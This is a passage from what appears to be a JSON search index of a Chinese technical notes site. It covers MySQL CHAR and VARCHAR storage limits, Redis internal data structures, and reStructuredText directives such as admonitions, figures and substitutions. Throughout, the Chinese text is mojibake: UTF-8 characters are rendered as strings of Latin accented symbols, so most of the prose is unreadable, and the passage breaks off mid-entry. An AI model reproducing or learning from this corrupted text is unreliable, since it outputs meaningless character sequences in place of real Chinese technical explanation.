ä¾‹å¦‚ï¼ŒMylSAMä¼šå°†è¡Œæ‹†æˆä¸åŒçš„ç‰‡æ®µå­˜å‚¨ï¼ŒInnoDBåˆ™éœ€è¦åˆ†è£‚é¡µæ¥ä½¿è¡Œå¯ä»¥æ”¾è¿›é¡µå†…ã€‚ CHAR CHARé€‚åˆå­˜å‚¨å¾ˆçŸ­æˆ–é•¿åº¦è¿‘ä¼¼çš„å­—ç¬¦ä¸²ã€‚ ä¾‹å¦‚ï¼ŒCHARéå¸¸é€‚åˆå­˜å‚¨å¯†ç çš„MD5å€¼ï¼Œå› ä¸ºè¿™æ˜¯ä¸€ä¸ªå®šé•¿çš„å€¼ã€‚ å¯¹äºç»å¸¸å˜æ›´çš„æ•°æ®ï¼ŒCHARä¹Ÿæ¯”VARCHARæ›´å¥½ï¼Œå› ä¸ºå®šé•¿çš„CHARç±»å‹ä¸å®¹æ˜“äº§ç”Ÿç¢ç‰‡ã€‚ å¯¹äºéå¸¸çŸ­çš„åˆ—ï¼ŒCHARæ¯”VARCHARåœ¨å­˜å‚¨ç©ºé—´ä¸Šä¹Ÿæ›´æœ‰æ•ˆç‡ã€‚ ä¾‹å¦‚ç”¨CHAR(1)æ¥å­˜å‚¨åªæœ‰Yå’ŒNçš„å€¼ï¼Œå¦‚æœé‡‡ç”¨å•å­—èŠ‚å­—ç¬¦é›†åªéœ€è¦ä¸€ä¸ªå­—èŠ‚ï¼Œ ä½†æ˜¯VARCHAR(1)å´éœ€è¦ä¸¤ä¸ªå­—èŠ‚ï¼Œå› ä¸ºè¿˜æœ‰ä¸€ä¸ªè®°å½•é•¿åº¦çš„é¢å¤–å­—èŠ‚ã€‚ å­˜å‚¨å®¹é‡ CHAR å¯¹äºcharç±»å‹æ¥è¯´ï¼Œæœ€å¤šåªèƒ½å­˜æ”¾çš„å­—ç¬¦ä¸ªæ•°ä¸º255ï¼Œå’Œç¼–ç æ— å…³ï¼Œä»»ä½•ç¼–ç æœ€å¤§å®¹é‡éƒ½æ˜¯255ã€‚ VARCHAR MySQLè¡Œé»˜è®¤æœ€å¤§65535å­—èŠ‚ï¼Œæ˜¯æ‰€æœ‰åˆ—å…±äº«ï¼ˆç›¸åŠ ï¼‰çš„ï¼Œæ‰€ä»¥VARCHARçš„æœ€å¤§å€¼å—æ­¤é™åˆ¶ã€‚ è¡¨ä¸­åªæœ‰å•åˆ—å­—æ®µæƒ…å†µä¸‹ï¼Œvarcharä¸€èˆ¬æœ€å¤šèƒ½å­˜æ”¾(65535 - 3)ä¸ªå­—èŠ‚ï¼Œ varcharçš„æœ€å¤§æœ‰æ•ˆé•¿åº¦é€šè¿‡æœ€å¤§è¡Œæ•°æ®é•¿åº¦å’Œä½¿ç”¨çš„å­—ç¬¦é›†æ¥ç¡®å®šï¼Œ é€šå¸¸çš„æœ€å¤§é•¿åº¦æ˜¯65532ä¸ªå­—ç¬¦ï¼ˆå½“å­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦éƒ½åªå 1ä¸ªå­—èŠ‚æ—¶ï¼Œèƒ½è¾¾åˆ°65532ä¸ªå­—ç¬¦ï¼‰ï¼› è®¡ç®—ä¸ºä»€ä¹ˆæ˜¯65532ä¸ªå­—ç¬¦ï¼Ÿ ç®—æ³•å¦‚ä¸‹ï¼ˆæœ‰ä½™æ•°æ—¶å‘ä¸‹å–æ•´ï¼‰: æœ€å¤§é•¿åº¦(å­—ç¬¦æ•°) = ï¼ˆè¡Œå­˜å‚¨æœ€å¤§å­—èŠ‚æ•° - NULLæ ‡è¯†åˆ—å ç”¨å­—èŠ‚æ•° - é•¿åº¦æ ‡è¯†å­—èŠ‚æ•°ï¼‰ / å­—ç¬¦é›†å•å­—ç¬¦æœ€å¤§å­—èŠ‚æ•° NULLæ ‡è¯†åˆ—å ç”¨å­—èŠ‚æ•°ï¼šå…è®¸NULLæ—¶ï¼Œå ä¸€å­—èŠ‚ é•¿åº¦æ ‡è¯†å­—èŠ‚æ•°ï¼šè®°å½•é•¿åº¦çš„æ ‡è¯†ï¼Œé•¿åº¦å°äºç­‰äº255ï¼ˆ28ï¼‰æ—¶ï¼Œå 1å­—èŠ‚ï¼›å°äº65535æ—¶ï¼ˆ216ï¼‰,å 2å­—èŠ‚ VARCHARç±»å‹åœ¨4.1å’Œ5.0ç‰ˆæœ¬å‘ç”Ÿäº†å¾ˆå¤§çš„å˜åŒ–ï¼Œä½¿å¾—æƒ…å†µæ›´åŠ å¤æ‚ã€‚ ä»MySQL 4.1å¼€å§‹ï¼Œæ¯ä¸ªå­—ç¬¦ä¸²åˆ—å¯ä»¥å®šä¹‰è‡ªå·±çš„å­—ç¬¦é›†å’Œæ’åºè§„åˆ™ã€‚è¿™äº›ä¸œè¥¿ä¼šå¾ˆå¤§ç¨‹åº¦ä¸Šå½±å“æ€§èƒ½ã€‚ 4.0ç‰ˆæœ¬åŠä»¥ä¸‹ï¼ŒMySQLä¸­varcharé•¿åº¦æ˜¯æŒ‰å­—èŠ‚å±•ç¤ºï¼Œå¦‚varchar(20)ï¼ŒæŒ‡çš„æ˜¯20å­—èŠ‚ï¼› 5.0ç‰ˆæœ¬åŠä»¥ä¸Šï¼ŒMySQLä¸­varcharé•¿åº¦æ˜¯æŒ‰å­—ç¬¦å±•ç¤ºã€‚å¦‚varchar(20)ï¼ŒæŒ‡çš„æ˜¯20å­—ç¬¦ã€‚ å½“ç„¶ï¼Œè¡Œæ€»é•¿åº¦è¿˜æ˜¯65535å­—èŠ‚ï¼Œè€Œå­—ç¬¦å’Œå­—èŠ‚çš„æ¢ç®—ï¼Œåˆ™ä¸ç¼–ç æ–¹å¼æœ‰å…³ï¼Œä¸åŒçš„å­—ç¬¦æ‰€å çš„å­—èŠ‚æ˜¯ä¸åŒçš„ã€‚ç¼–ç åˆ’åˆ†å¦‚ä¸‹ï¼š GBKç¼–ç  ä¸€ä¸ªè‹±æ–‡å­—ç¬¦å ä¸€ä¸ªå­—èŠ‚ï¼Œä¸­æ–‡2å­—èŠ‚ï¼Œå•å­—ç¬¦æœ€å¤§å¯å ç”¨2ä¸ªå­—èŠ‚ã€‚ UTF-8ç¼–ç  ä¸€ä¸ªè‹±æ–‡å­—ç¬¦å ä¸€ä¸ªå­—èŠ‚ï¼Œä¸­æ–‡3å­—èŠ‚ï¼Œå•å­—ç¬¦æœ€å¤§å¯å ç”¨3ä¸ªå­—èŠ‚ã€‚ utf8mb4ç¼–ç  ä¸€ä¸ªè‹±æ–‡å­—ç¬¦å ä¸€ä¸ªå­—èŠ‚ï¼Œä¸­æ–‡3å­—èŠ‚ï¼Œå•å­—ç¬¦æœ€å¤§å 4ä¸ªå­—èŠ‚ï¼ˆå¦‚emojiè¡¨æƒ…4å­—èŠ‚ï¼‰ã€‚ å‡è®¾å½“å‰è¿˜æœ‰6å­—èŠ‚å¯ä»¥å­˜æ”¾å­—ç¬¦ï¼ŒæŒ‰å•å­—ç¬¦å ç”¨æœ€å¤§å­—èŠ‚æ•°æ¥ç®—ï¼Œå¯ä»¥å­˜æ”¾3ä¸ªGBKã€æˆ–2ä¸ªutf8ã€æˆ–1ä¸ªutf8mb4ã€‚ æ€è€ƒï¼šæ—¢ç„¶VARCHARé•¿åº¦å¯å˜ï¼Œé‚£æˆ‘è¦ä¸è¦å®šåˆ°æœ€å¤§? æ²¡é”™ï¼Œç›¸ä¿¡ä½ å·²ç»æœ‰ç­”æ¡ˆäº†ï¼Œåˆ«è¿™ä¹ˆå¹²ï¼ å°±åƒä½¿ç”¨VARCHAR(5)å’ŒVARCHAR(200)å­˜å‚¨ 'é™ˆå“ˆå“ˆ'çš„ç£ç›˜ç©ºé—´å¼€é”€æ˜¯ä¸€æ ·çš„ã€‚ é‚£ä¹ˆä½¿ç”¨æ›´çŸ­çš„åˆ—æœ‰ä»€ä¹ˆä¼˜åŠ¿å‘¢ï¼Ÿ äº‹å®è¯æ˜æœ‰å¾ˆå¤§çš„ä¼˜åŠ¿ã€‚ æ›´é•¿çš„åˆ—ä¼šæ¶ˆè€—æ›´å¤šçš„å†…å­˜ï¼Œå› ä¸ºMySQLé€šå¸¸ä¼šåˆ†é…å›ºå®šå¤§å°çš„å†…å­˜å—æ¥ä¿å­˜å†…éƒ¨å€¼ã€‚ å½“ç„¶ï¼Œåœ¨æ²¡æ‹¿åˆ°å­˜å‚¨å¼•æ“å­˜å‚¨çš„æ•°æ®ä¹‹å‰ï¼Œ å¹¶ä¸ä¼šçŸ¥é“æˆ‘è¿™ä¸€è¡Œæ‹¿å‡ºæ¥çš„æ•°æ®åˆ°åº•æœ‰å¤šé•¿ï¼Œå¯èƒ½é•¿åº¦åªæœ‰1ï¼Œå¯èƒ½é•¿åº¦æ˜¯500ï¼Œé‚£æ€ä¹ˆåŠå‘¢ï¼Ÿ é‚£å°±åªèƒ½å…ˆæŠŠæœ€å¤§ç©ºé—´åˆ†é…å¥½äº†ï¼Œé¿å…æ”¾ä¸ä¸‹çš„é—®é¢˜å‘ç”Ÿï¼Œè¿™æ ·å®é™…ä¸Šå¯¹äºçœŸå®æ•°æ®è¾ƒçŸ­çš„varcharç¡®å®ä¼šé€ æˆç©ºé—´çš„æµªè´¹ã€‚ ä¸¾ä¾‹ï¼šæˆ‘å‘æ•°æ®ç±»å‹ä¸ºï¼švarcharï¼ˆ1000ï¼‰çš„åˆ—æ’å…¥äº†1024è¡Œæ•°æ®ï¼Œ ä½†æ˜¯æ¯ä¸ªåªå­˜ä¸€ä¸ªå­—ç¬¦ï¼Œé‚£ä¹ˆè¿™1024è¡ŒçœŸå®æ•°æ®é‡å…¶å®åªæœ‰1Kï¼Œ ä½†æ˜¯æˆ‘å´éœ€è¦çº¦1Mçš„å†…å­˜å»é€‚åº”ä»–ã€‚æ‰€ä»¥æœ€å¥½çš„ç­–ç•¥æ˜¯åªåˆ†é…çœŸæ­£éœ€è¦çš„ç©ºé—´ã€‚ æ³¨è§£ ä¸ CHAR å’Œ VARCHAR ç±»ä¼¼çš„ç±»å‹è¿˜æœ‰ BINARY å’Œ VARBINARY, å®ƒä»¬å­˜å‚¨çš„æ˜¯äºŒè¿›åˆ¶å­—ç¬¦ä¸². äºŒè¿›åˆ¶å­—ç¬¦ä¸²è·Ÿå¸¸è§„å­—ç¬¦ä¸²éå¸¸ç›¸ä¼¼ï¼Œä½†æ˜¯äºŒè¿›åˆ¶å­—ç¬¦ä¸²å­˜å‚¨çš„æ˜¯å­—èŠ‚ç è€Œä¸æ˜¯å­—ç¬¦ã€‚ å¡«å……ä¹Ÿä¸ä¸€æ ·: MySQLå¡«å……BINARYé‡‡ç”¨çš„æ˜¯ \\0 (é›¶å­—èŠ‚)è€Œä¸æ˜¯ç©ºæ ¼ï¼Œåœ¨æ£€ç´¢æ—¶ä¹Ÿä¸ä¼šå»æ‰å¡«å……å€¼ã€‚ å½“éœ€è¦å­˜å‚¨äºŒè¿›åˆ¶æ•°æ®ï¼Œå¹¶ä¸”å¸Œæœ›MySQLä½¿ç”¨å­—èŠ‚ç è€Œä¸æ˜¯å­—ç¬¦è¿›è¡Œæ¯”è¾ƒæ—¶ï¼Œè¿™äº›ç±»å‹æ˜¯éå¸¸æœ‰ç”¨çš„ã€‚ äºŒè¿›åˆ¶æ¯”è¾ƒçš„ä¼˜åŠ¿å¹¶ä¸ä»…ä»…ä½“ç°åœ¨å¤§å°å†™æ•æ„Ÿä¸Šã€‚ MySQLæ¯”è¾ƒBINARYå­—ç¬¦ä¸²æ—¶ï¼Œæ¯æ¬¡æŒ‰ä¸€ä¸ªå­—èŠ‚ï¼Œå¹¶ä¸”æ ¹æ®è¯¥å­—èŠ‚çš„æ•°å€¼è¿›è¡Œæ¯”è¾ƒã€‚ å› æ­¤ï¼ŒäºŒè¿›åˆ¶æ¯” è¾ƒæ¯”å­—ç¬¦æ¯”è¾ƒç®€å•å¾ˆå¤šï¼Œæ‰€ä»¥ä¹Ÿå°±æ›´å¿«ã€‚","tags":"æ•°æ®åº“","url":"/yq-doc-source-docs-database-mysql-Conceptual-foundation-Data-type-Varchar-and-Char.html","loc":"/yq-doc-source-docs-database-mysql-Conceptual-foundation-Data-type-Varchar-and-Char.html"},{"title":"å‡½æ•°API","text":"æ•°å€¼è®¡ç®— round(num, n) ç›´æ¥å››èˆäº”å…¥ï¼Œround($num, $n)ï¼Œå››èˆäº”å…¥ä¿ç•™ n ä½å°æ•° å­—ç¬¦ä¸²æ‹¼æ¥","tags":"æ•°æ®åº“","url":"/yq-doc-source-docs-database-mysql-Conceptual-foundation-Function-API.html","loc":"/yq-doc-source-docs-database-mysql-Conceptual-foundation-Function-API.html"},{"title":"åº•å±‚å®ç°","text":"åŸºäºepoll, å¤šè·¯å¤ç”¨ I/Oå¤šè·¯å¤ç”¨åº•å±‚ä¸»è¦ç”¨çš„Linux å†…æ ¸å‡½æ•° ï¼ˆselect, poll, epollï¼‰æ¥å®ç°ï¼Œ windowsä¸æ”¯æŒepollå®ç°ï¼Œwindowsåº•å±‚æ˜¯åŸºäºwinsock2çš„ selectå‡½æ•°å®ç°çš„ï¼ˆä¸å¼€æºï¼‰ Linuxä¸‹å¯å‚è€ƒ /docs/æ“ä½œç³»ç»Ÿ/linux/æ¦‚å¿µæ€§/IOæ¨¡å‹ åº•å±‚æ•°æ®ç»“æ„ æ•´ä½“çœ‹æ˜¯å¤§çš„å…¨å±€hashè¡¨(k-v) ä½†æ˜¯å¯¹äºvalueæ¥è¯´, æœ‰ä¸åŒæƒ…å†µ. valueå¸¸è§æ”¯æŒç±»å‹: String List (æ¯”å¦‚æ¶ˆæ¯é˜Ÿåˆ—) Set (æ¯”å¦‚å…³æ³¨åˆ—è¡¨) Hash (å¤æ‚æœ€æƒ³å­˜å‚¨) Zsetï¼ˆæœ‰åºé›†åˆï¼‰SortSet (æ¯”å¦‚æ’è¡Œæ¦œ) String ç®€å•åŠ¨æ€å­—ç¬¦ä¸² èƒ½è½¬æ•´æ•°çš„, ç”¨int å°äºç­‰äº44å­—èŠ‚çš„, ç”¨ \"embstr\" å¤§äº44å­—èŠ‚, ç”¨ \"raw\" å¦‚æœè¦æŸ¥çœ‹åº•å±‚æ•°æ®å­˜å‚¨: object encoding $key Hash hashè¡¨, å‹ç¼©åˆ—è¡¨ List å‹ç¼©åˆ—è¡¨(ziplist), åŒå‘é“¾è¡¨ Set hashè¡¨, æ•´æ•°æ•°ç»„ ZSet å‹ç¼©åˆ—è¡¨, è·³è¡¨(skiplist) å¯èƒ½ä¼šåœ¨å­˜å‚¨æ—¶å€™, åˆ‡æ¢æ•°æ®ç»“æ„ è·³è¡¨(skiplist)ä¼˜åŒ– å¯¹äºæ¯ä¸¤ä¸ªå…ƒç´ , å–ç¬¬ä¸€ä¸ªå‘ä¸Šæå–ä¸€å±‚(å»ºç«‹å†—ä½™ç´¢å¼•), ç±»ä¼¼äºB+æ ‘ æé«˜æŸ¥æ‰¾æ€§èƒ½","tags":"æ•°æ®åº“","url":"/yq-doc-source-docs-database-redis-Underlying-implementation.html","loc":"/yq-doc-source-docs-database-redis-Underlying-implementation.html"},{"title":"Admonitions","text":"æç¤ºä¿¡æ¯ Specific Admonitions æ”¯æŒä»¥ä¸‹ç±»å‹: attention caution danger error hint important note tip warning å¦‚ä½¿ç”¨tip, æºç : .. tip:: this is a tip msg æ•ˆæœ æŠ€å·§ this is a tip msg Generic Admonition ä¸ä¸ŠåŒºåˆ«æ›´åƒæ˜¯æ”¯æŒè‡ªå®šä¹‰è­¦å‘Šæ ‡é¢˜ æ”¯æŒçš„ç±»å‹: admonition ä¸¾ä¾‹, æºç : .. admonition:: And, by the way... You can make up your own admonition too. æ•ˆæœ And, by the way... You can make up your own admonition too.","tags":"æ–‡æ¡£","url":"/yq-doc-source-docs-document-RST-mark-language-DOC-grammar-module-Admonitions.html","loc":"/yq-doc-source-docs-document-RST-mark-language-DOC-grammar-module-Admonitions.html"},{"title":"body-elements","text":"å¯ä»¥ç†è§£ä¸ºhtmlçš„body å‚è€ƒ: docutilsæ–‡æ¡£ -> body-elements topic å¯ä»¥ç†è§£ä¸ºè‡ªç„¶å°èŠ‚, èƒ½è¾ƒå¥½æ§åˆ¶æ ·å¼æ•ˆæœ æºç : .. topic:: Topic Title Subsequent indented lines comprise the body of the topic, and are interpreted as body elements. æ•ˆæœ Topic Title Subsequent indented lines comprise the body of the topic, and are interpreted as body elements. sidebar æ”¯æŒçš„é€‰é¡¹ subtitle: text å‰¯æ ‡é¢˜, å¯é€‰ æºç : .. sidebar:: sidebar title :subtitle: sidebar sub Title this is a sidebar ... æ•ˆæœ (åœ¨å³è¾¹, å±å¹•ä¾§è¾¹) sidebar title sidebar sub Title this is a sidebar ... line-block ä¸€ä¸ªä¿ç•™åŸæœ‰ç¼©è¿›çš„æ®µè½, ä¸å»ºè®®ä½¿ç”¨, å»ºè®®ç›´æ¥ä½¿ç”¨ç«–çº¿ ç”¨ä¾‹è¯´æ˜, æºç : .. line-block:: æ—©, åƒæ—©é¥­ ä¸­ åƒåƒåƒåƒåƒåƒåƒåƒåƒåƒ æ™š é¢æ¡é¢æ¡é¢æ¡é¢æ¡é¢æ¡é¢æ¡ æ•ˆæœ æ—©, åƒæ—©é¥­ ä¸­ åƒåƒåƒåƒåƒåƒåƒåƒåƒåƒ æ™š é¢æ¡é¢æ¡é¢æ¡é¢æ¡é¢æ¡é¢æ¡ code æ”¯æŒçš„å‘½ä»¤é€‰é¡¹: number-lines: [int] æ˜¯å¦å±•ç¤ºè¡Œå·, å€¼ä¸ºèµ·å§‹è¡Œå·, é»˜è®¤ä¸º1 math æ˜¾ç¤ºæ•°å­¦å…¬å¼, å‰æéœ€è¦æ ¼å¼æ”¯æŒ epigraph åè¨€è­¦å¥, å¼•ç”¨è¯—æ­Œç­‰ ç”¨ä¾‹, æºç : .. epigraph:: No matter where you go, there you are. (è¯‘: æ— è®ºä½ å»å“ªé‡Œï¼Œä½ éƒ½åœ¨é‚£é‡Œ)ã€‚ -- Buckaroo Banzai æ•ˆæœ No matter where you go, there you are. (è¯‘: æ— è®ºä½ å»å“ªé‡Œï¼Œä½ éƒ½åœ¨é‚£é‡Œ)ã€‚ â€”Buckaroo Banzai compound \"å¤åˆ\"æŒ‡ä»¤ç”¨äºåˆ›å»ºå¤åˆæ®µè½ï¼Œå®ƒæ˜¯åŒ…å«å¤šä¸ªç‰©ç†æ­£æ–‡å…ƒç´ (å¦‚ç®€å•æ®µè½ã€æ–‡å­—å—ã€è¡¨æ ¼ã€åˆ—è¡¨ç­‰)çš„å•ä¸ªé€»è¾‘æ®µè½ï¼Œè€Œä¸æ˜¯ç›´æ¥åŒ…å«æ–‡æœ¬å’Œå†…è”å…ƒç´ ã€‚ ä¾‹å¦‚, æºç : .. compound:: å¦‚æœè¦æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶, å¯ä»¥ä½¿ç”¨lså‘½ä»¤:: ls ./ æŸäº›æ— æƒé™çš„æ–‡ä»¶å¯èƒ½æ— æ³•è®¿é—®, è¿™æ—¶éœ€è¦ç»™äºˆç›¸åº”çš„æƒé™ æ•ˆæœ å¦‚æœè¦æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶, å¯ä»¥ä½¿ç”¨lså‘½ä»¤: ls ./ æŸäº›æ— æƒé™çš„æ–‡ä»¶å¯èƒ½æ— æ³•è®¿é—®, è¿™æ—¶éœ€è¦ç»™äºˆç›¸åº”çš„æƒé™ container æ³¨æ„ç´§è·Ÿç€çš„ç›¸å½“äºç±»å±æ€§(ç›¸å½“äºHTMLçš„CLASSå±æ€§), å…·ä½“çš„æ•ˆæœéœ€è¦ç”¨æˆ·è‡ªå®šä¹‰, å…·ä½“æ€ä¹ˆè‡ªå®šä¹‰æš‚æ—¶æ²¡ä»å®˜æ–¹æ–‡æ¡£çœ‹åˆ°, éš¾ä¸æˆæ˜¯è‡ªå®šä¹‰CSS ? æ¯”å¦‚ä»¥ä¸‹çš„custom: .. container:: custom æœ¬æ®µå¯ä»¥ä»¥è‡ªå®šä¹‰æ–¹å¼å‘ˆç°ã€‚","tags":"æ–‡æ¡£","url":"/yq-doc-source-docs-document-RST-mark-language-DOC-grammar-module-Body-Elements.html","loc":"/yq-doc-source-docs-document-RST-mark-language-DOC-grammar-module-Body-Elements.html"},{"title":"Directives for Substitution Definitions","text":"replace ç”¨äºæ›¿æ¢ä¸Šä¸‹æ–‡æ–‡æœ¬. æºç : .. |å¥¥æ–¯| replace:: å¥¥æ–¯ç‰¹æ´›å¤«æ–¯åŸº |å¥¥æ–¯| è¯´è¿‡: é’¢é“æ˜¯æˆ‘æ•™ä½ ä»¬ç»ƒæˆçš„. å¼€ä¸ªç©ç¬‘. æ•ˆæœ å¥¥æ–¯ç‰¹æ´›å¤«æ–¯åŸº è¯´è¿‡: é’¢é“æ˜¯æˆ‘æ•™ä½ ä»¬ç»ƒæˆçš„. å¼€ä¸ªç©ç¬‘. å¦å¤–, ç”±äºreStructuredTextä¸æ”¯æŒåµŒå¥—å†…è”æ ‡è®°ï¼Œå› æ­¤åˆ›å»ºå¸¦æœ‰æ ·å¼æ–‡æœ¬çš„å¼•ç”¨çš„å”¯ä¸€æ–¹æ³•æ˜¯ä½¿ç”¨\"æ›¿æ¢\"æŒ‡ä»¤çš„æ›¿æ¢. ä¾‹å¦‚: I recommend you try Python, the best language around . å¯¹åº”æºç : I recommend you try |Python|_. .. |Python| replace:: Python, *the* best language around .. _Python: https://www.python.org/ unicode ç”¨äºè½¬æ¢Unicodeå­—ç¬¦, æ²¡ä»€ä¹ˆåº”ç”¨åœºæ™¯, è§ unicode-character-codes date ç”¨äºåµŒå…¥å½“å‰æ—¥æœŸ, æ ¼å¼ç­‰åŒäº time æ¨¡å—çš„ time.strftime() é»˜è®¤æ ¼å¼ä¸º %Y-%m-%d ä¾‹, æºç : .. |date| date:: .. |time| date:: %H:%M ä»Šå¤©æ˜¯ |date|. æ–‡æ¡£è¢«åˆ›å»ºä¸ |date| at |time|. æ•ˆæœ ä»Šå¤©æ˜¯ 2024-03-22. æ–‡æ¡£è¢«åˆ›å»ºä¸ 2024-03-22 at 15:07.","tags":"æ–‡æ¡£","url":"/yq-doc-source-docs-document-RST-mark-language-DOC-grammar-module-Directives-for-substitution-definitions.html","loc":"/yq-doc-source-docs-document-RST-mark-language-DOC-grammar-module-Directives-for-substitution-definitions.html"},{"title":"Document Parts","text":"contents ç”Ÿæˆå½“å‰æ–‡æ¡£ç›®å½• æ”¯æŒå‘½ä»¤é€‰é¡¹ depth: integer ç›®å½•æ·±åº¦, é»˜è®¤ä¸é™åˆ¶ local: flag (empty) ç”Ÿæˆæœ¬åœ°ç›®å½•ã€‚æ¡ç›®å°†ä»…åŒ…æ‹¬æä¾›å°èŠ‚(flag)çš„å­èŠ‚ã€‚å¦‚æœæ²¡æœ‰ç»™å‡ºæ˜¾å¼æ ‡é¢˜ï¼Œç›®å½•å°†ä¸ä¼šæœ‰æ ‡é¢˜ã€‚ backlinks: \"entry\" or \"top\" or \"none\" ä»éƒ¨åˆ†æ ‡é¢˜ç”Ÿæˆé“¾æ¥å›åˆ°ç›®å½•æ¡ç›®ã€ç›®å½•æœ¬èº«ï¼Œæˆ–ä¸ç”Ÿæˆåå‘é“¾æ¥ class: text è®¾ç½®ç±»å±æ€§ ç”¨ä¾‹, æºç : .. contents:: Here's a very long Table of Contents AAAAAA æ•ˆæœ Here's a very long Table of Contents AAAAAA contents header / footer header / footer \"æ ‡é¢˜\"å’Œ\"é¡µè„š\"æŒ‡ä»¤åˆ›å»ºæ–‡æ¡£è£…é¥°ï¼Œå¯ç”¨äºé¡µé¢å¯¼èˆªã€æ³¨é‡Šã€æ—¶é—´/æµ‹è¯•ç­‰ã€‚ ä¾‹å¦‚: .. header:: This space for rent BBBBBBBB. è¿™å°†å‘æ–‡æ¡£æ ‡é¢˜æ·»åŠ ä¸€ä¸ªæ®µè½ï¼Œè¯¥æ®µè½å°†æ˜¾ç¤ºåœ¨ç”Ÿæˆçš„ç½‘é¡µé¡¶éƒ¨æˆ–æ¯ä¸ªæ‰“å°é¡µé¢çš„é¡¶éƒ¨ã€‚ è¿™äº›æŒ‡ä»¤å¯ä»¥ç´¯è®¡å¤šæ¬¡ä½¿ç”¨ã€‚ç›®å‰åªæ”¯æŒä¸€ä¸ªé¡µçœ‰å’Œé¡µè„šã€‚ è­¦å‘Š å®é™…æµ‹è¯•ä¸é€‚ç”¨äºrstç”Ÿæˆçš„æ–‡æ¡£, æ— ä»»ä½•æ•ˆæœ, å¼ƒä¹‹.","tags":"æ–‡æ¡£","url":"/yq-doc-source-docs-document-RST-mark-language-DOC-grammar-module-Document-parts.html","loc":"/yq-doc-source-docs-document-RST-mark-language-DOC-grammar-module-Document-parts.html"},{"title":"Images","text":"Image æ”¯æŒç±»å‹ image æ”¯æŒçš„å‘½ä»¤é€‰é¡¹: alt: text å½“åº”ç”¨ä¸èƒ½åŠ è½½å›¾ç‰‡æ—¶, æ˜¾ç¤ºçš„æ–‡å­— height: length å›¾ç‰‡é«˜åº¦ width: length or percentage of the current line width å›¾ç‰‡å®½åº¦ scale: integer percentage (the \"%\" symbol is optional) å›¾ç‰‡ç¼©æ”¾, ä»¥ç™¾åˆ†æ¯”çš„å½¢å¼, é»˜è®¤ 100% align: \"top\", \"middle\", \"bottom\", \"left\", \"center\", or \"right\" å›¾ç‰‡ä½ç½® target: text (URI or reference name) å›¾ç‰‡å¯è¢«ç‚¹å‡», æ”¯æŒä¸¤ç§å½¢å¼: - url, ç‚¹å‡»è·³è½¬åˆ°url - å¯ä»¥é€šè¿‡ç±»ä¼¼è¿™æ · `a name`_ è·³è½¬ and the common options class and name. ç¤ºä¾‹, æºç : .. image:: ../../resources/images/2023-02-02-15-11-21.png :alt: test_image :scale: 50% :align: center :target: https://www.baidu.com Figure å‘½ä»¤ç±»å‹: figure ä¸imageçš„åŒºåˆ«æ˜¯, å¯ä»¥åœ¨å›¾ç‰‡ä¸‹æ ‡æ³¨æ–‡å­—æ®µè½(å¯é€‰). æºç : .. figure:: ../../../resources/images/2023-02-02-15-55-24.png :scale: 50 % :alt: map to buried treasure This is the caption of the figure (a simple paragraph). The legend consists of all elements after the caption. In this case, the legend consists of this paragraph and the following table: +----------------------------------------------------------------+-----------------------+ | Symbol | Meaning | +================================================================+=======================+ | .. image:: ../../../resources/images/2023-02-02-15-55-24.png | | | :scale: 30% | Campground | | | | +----------------------------------------------------------------+-----------------------+ | .. image:: ../../../resources/images/2023-02-02-15-55-24.png | | | :scale: 30% | Lake | | | | +----------------------------------------------------------------+-----------------------+ | .. image:: ../../../resources/images/2023-02-02-15-55-24.png | | | :scale: 30% | Mountain | | | | +----------------------------------------------------------------+-----------------------+ .. csv-table:: :header: Symbol, Meaning .. image:: ../../../resources/images/2023-02-02-15-55-24.png , Campground .. image:: ../../../resources/images/2023-02-02-15-55-24.png , Lake .. image:: ../../../resources/images/2023-02-02-15-55-24.png , Mountain æ•ˆæœ This is the caption of the figure (a simple paragraph). The legend consists of all elements after the caption. In this case, the legend consists of this paragraph and the following table: Symbol Meaning Campground Lake Mountain Symbol Meaning Campground Lake Mountain æ”¯æŒå‘½ä»¤é€‰é¡¹, é™¤äº†æ”¯æŒimageçš„æ‰€æœ‰é€‰é¡¹å¤–, è¿˜æ”¯æŒä»¥ä¸‹é€‰é¡¹: align: \"left\", \"center\", or \"right\" æ­¤å¤„åˆ—å‡ºä¸»è¦è¯´æ˜åªæ”¯æŒä»¥ä¸Šä¸‰ä¸ªå‚æ•° figwidth: \"image\", length, or percentage of current line width æ³¨æ„æ›´æ”¹çš„æ˜¯æ‰€åœ¨åŒºåŸŸçš„å®½åº¦è€Œéå›¾ç‰‡å®½åº¦. å½“å‚æ•°å€¼ä¸ºå›¾ç‰‡è·¯å¾„æ—¶: è‹¥å›¾ç‰‡ä¸å­˜åœ¨, åˆ™å¿½ç•¥æ­¤é€‰é¡¹; è‹¥å­˜åœ¨åˆ™ä½¿ç”¨è¯¥å›¾ç‰‡çš„çœŸå®å®½åº¦å€¼(ä¾èµ–pythonçš„Imagingåº“). å®é™…è¿ä½œå¯å‚è€ƒä¸‹å›¾: +---------------------------+ | figure | | | |<------ figwidth --------->| | | | +---------------------+ | | | image | | | | | | | |<--- width --------->| | | +---------------------+ | | | |The figure's caption should| |wrap at this width. | +---------------------------+ figclass: text è®¾ç½® classes å±æ€§, æš‚æ—¶ä¸çŸ¥é“æœ‰ä»€ä¹ˆç”¨","tags":"æ–‡æ¡£","url":"/yq-doc-source-docs-document-RST-mark-language-DOC-grammar-module-Images.html","loc":"/yq-doc-source-docs-document-RST-mark-language-DOC-grammar-module-Images.html"},{"title":"Miscellaneous","text":"include åµŒå…¥æ–‡ä»¶å†…å®¹, ä¸å»ºè®®ä½¿ç”¨. è§ including-an-external-document-fragment è­¦å‘Š \"include\"æŒ‡ä»¤ä»£è¡¨ä¸€ä¸ªæ½œåœ¨çš„å®‰å…¨æ¼æ´ã€‚å¯ä»¥é€šè¿‡\"file_insertion_enabled\"è¿è¡Œæ—¶è®¾ç½®ç¦ç”¨å®ƒã€‚ raw rawä¹Ÿå­˜åœ¨å®‰å…¨é—®é¢˜, æ•…ä¸å»ºè®®ä½¿ç”¨. æ”¯æŒçš„å‘½ä»¤é€‰é¡¹: file: string (newlines removed) æœ¬åœ°æ–‡ä»¶è·¯å¾„ url: string (whitespace removed) æ–‡ä»¶ç½‘ç»œè·¯å¾„ encoding: string æ–‡ä»¶è¯»å–æ ¼å¼, é»˜è®¤è¾“å…¥æ–‡ä»¶æ ¼å¼ rawå¯ä»¥å°†å†…å®¹è½¬æ¢å¯¹åº”çš„æ 